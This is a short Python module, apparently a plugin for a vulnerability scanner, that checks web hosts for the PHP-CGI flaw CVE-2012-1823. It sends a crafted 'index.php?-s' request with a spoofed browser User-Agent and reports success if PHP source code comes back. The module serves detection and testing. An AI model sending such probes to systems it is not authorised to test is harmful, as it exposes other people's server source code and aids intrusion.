import requests
from utils import ping
from utils.status import *

class CVE_2012_1823:
    def __init__(self, host) -> None:
        self.name        = "PHP-CGI - CVE_2012_1823"
        self.enable      = True
        self.description = ""
        self.host = host

    def isAlive(self, host):
        return ping.is_alive(host)


    def main(self):
        if self.isAlive(self.host):
            poc = self.host + "index.php?-s"
            headers = {
                            "User-Agent": "Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)",
                        }
            request = requests.request('GET', poc, headers=headers, timeout=5)

            if '&lt;?php' in request.text:
                return SUCCESS
            else:
                return FAILED
        else:
            return ERROR